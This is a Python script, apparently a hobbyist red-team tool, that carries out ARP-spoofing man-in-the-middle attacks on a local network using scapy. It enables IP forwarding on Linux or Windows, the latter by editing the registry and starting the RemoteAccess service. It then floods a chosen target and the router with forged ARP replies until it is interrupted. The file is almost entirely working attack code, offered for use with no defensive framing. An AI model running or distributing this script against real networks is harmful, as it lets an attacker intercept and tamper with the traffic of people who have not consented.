import os
import sys
import platform
import subprocess
from time import sleep

import warnings
warnings.filterwarnings("ignore")

import scapy.all as scapy
from termcolor import colored


class ARPSpoofer:
    def show_banner(self):
        banner = """
                        [A] [R] [P] --- [S] [P] [O] [O] [F]
           ◤------------------------------------------------------------------◥
           |💻: Hey, James!<═══>🖥️: What?<═══>📡: I'm Router!<═══>🖥️: Okay! ;)|
           |💻: Hey, Router!<═══>📡: What?<═══>🖥️: I'm James!<═══>📡: Okay! ;)|
           ◣------------------------------------------------------------------◢
        """
        print(banner)
        print(colored("    [🕸️] Script mode: ", "light_yellow") + colored("🔴 Red SWAT", "red"))
        print(colored("    [🕸️️] Function: ", "light_yellow") + colored("Launch MITM-attack\n", "red"))

    def enIPfor(self):
        global os_system
        if os_system == "Linux":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")

        elif os_system == "Windows":
            try:
                check_service = 'Get-Service -Name RemoteAccess -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status'
                result = subprocess.run(["powershell", "-Command", check_service], capture_output=True, text=True)
                service_status = result.stdout.strip()

                if service_status == "Stopped" or service_status == "":
                    subprocess.run(["powershell", "-Command", "Set-Service -Name RemoteAccess -StartupType Automatic"],
                                   capture_output=True, check=True)
                    subprocess.run(["powershell", "-Command", "Start-Service -Name RemoteAccess"], capture_output=True,
                                   check=True)
                    print(colored("[+] The service RemoteAccess launched", "green"))
                else:
                    print(colored("[+] The service RemoteAccess has already launched", "green"))

                subprocess.run(["powershell", "-Command",
                                'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -Name "IPEnableRouter" -Value 1 -Type DWord'],
                               capture_output=True, check=True)
                print(colored("[+] IP-forwarding turned on in reestr", "green"))

                print(colored("[+] IP-forwarding launched (A reboot will be required for full application)", "green"))
                return True

            except Exception as e:
                print(colored(f"[-] Error: {e}", "red"))
                return False

    def disIPfor(self):
        global os_system
        if os_system == "Linux":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
            print(colored("[+] IP-форвардинг turned off", "green"))
            return True

        elif os_system == "Windows":
            try:
                subprocess.run(["powershell", "-Command",
                                'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -Name "IPEnableRouter" -Value 0 -Type DWord'],
                               capture_output=True, check=True)
                print(colored("[+] IP-форвардинг turned off in reestr", "green"))

                try:
                    subprocess.run(["netsh", "interface", "ipv4", "set", "interface", "0", "forwarding=disabled"],
                                   capture_output=True, check=True)
                    print(colored("[+] IP-forwarding turned off through the netsh", "green"))
                except:
                    pass

                try:
                    subprocess.run(["powershell", "-Command", "Stop-Service -Name RemoteAccess -Force"],
                                   capture_output=True, check=True, timeout=5)
                    print(colored("[+] The service RemoteAccess stopped", "green"))
                except subprocess.TimeoutExpired:
                    print(colored("[!] The waiting time has expired when the service is stopped", "yellow"))
                except:
                    print(colored("[-] Failed to stopp the service RemoteAccess", "red"))

                print(colored("[+] IP-форвардинг turned off", "green"))
                return True

            except Exception as e:
                print(colored(f"[-] Error was occured during turning off the IP-forwarding: {e}", "red"))
                return False

    def getMAC(self, IP):
        arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst=IP)
        answered, unanswered = scapy.srp(arp_request, timeout=2, verbose=0)

        if answered:
            return answered[0][1].hwsrc
        else:
            return None

    def recover_network(self, targetIP, routerIP, targetMAC, routerMAC, retries=3):
        for attempt in range(retries):
            try:
                print(colored("[*] Recovering the ARP-tables...", "yellow"))
                scapy.send(scapy.ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC, hwsrc=routerMAC), count=5,
                           verbose=0)
                scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC, hwsrc=targetMAC), count=5,
                           verbose=0)
                print(colored("[+] The network was recovered!", "green"))
                return True
            except Exception as e:
                print(colored(f"[-] Error on attempt {attempt + 1}: {e}", "red"))
                if attempt == retries - 1:
                    print(colored("[-] Failed to recover the network after all attempts", "red"))
                    return False
                sleep(0.5)

    def check_admin(self):
        if os.name == 'nt':
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.geteuid() == 0

    def arp_spoof(self, targetIP, routerIP="192.168.1.1"):
        print(colored(f"[*] Extracting {targetIP} MAC-address...", "yellow"))
        sleep(1)
        targetMAC = self.getMAC(targetIP)
        if not targetMAC:
            return False
        print(colored(f"[+] MAC-address: {targetMAC}", "green"))
        sleep(0.5)
        print(colored(f"[*] Extracting {routerIP} MAC-address...", "yellow"))
        sleep(1)
        routerMAC = self.getMAC(routerIP)
        if not routerMAC:
            return False
        print(colored(f"[+] MAC-address: {routerMAC}", "yellow"))
        sleep(0.5)
        print(colored("[*] Starting ARP-Spoofing...", "yellow"))
        print(colored("[*] Press Ctrl+C to stop and recover ARP tables\n\n", "yellow"))
        self.enIPfor()
        packets = 0
        while True:
            try:
                target_spoof_packet = scapy.ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC)
                router_spoof_packet = scapy.ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC)

                scapy.send(target_spoof_packet, verbose=0)
                scapy.send(router_spoof_packet, verbose=0)

                packets += 2

                print(colored(f"[+] {packets} packets sent!", "green"))
                print(target_spoof_packet)
                print(router_spoof_packet)

                sleep(1)
            except KeyboardInterrupt:
                answer = input(colored("[*] Ctrl+C was detected. Recover the ARP tables (Y/n)?", "yellow"))
                if answer == 'Y':
                    print(colored("[*] Recovering the ARP tables...", "yellow"))
                    self.recover_network(targetIP, routerIP, targetMAC, routerMAC)
                    self.disIPfor()
                    print(colored("[+] ARP tables were recovered successfully!", "green"))
                    sleep(0.5)
                    print(colored("[+] Attack was finished successfully!", "green"))
                elif answer == 'n':
                    self.disIPfor()
                    print(colored("[+] Attack was finished successfully!", "green"))


arp_spoofer = ARPSpoofer()
arp_spoofer.show_banner()
if len(sys.argv) > 1:
    target = sys.argv[1]
else:
    target = input(colored("[*] Enter the target IP: ", "yellow"))
arp_spoofer.arp_spoof(target)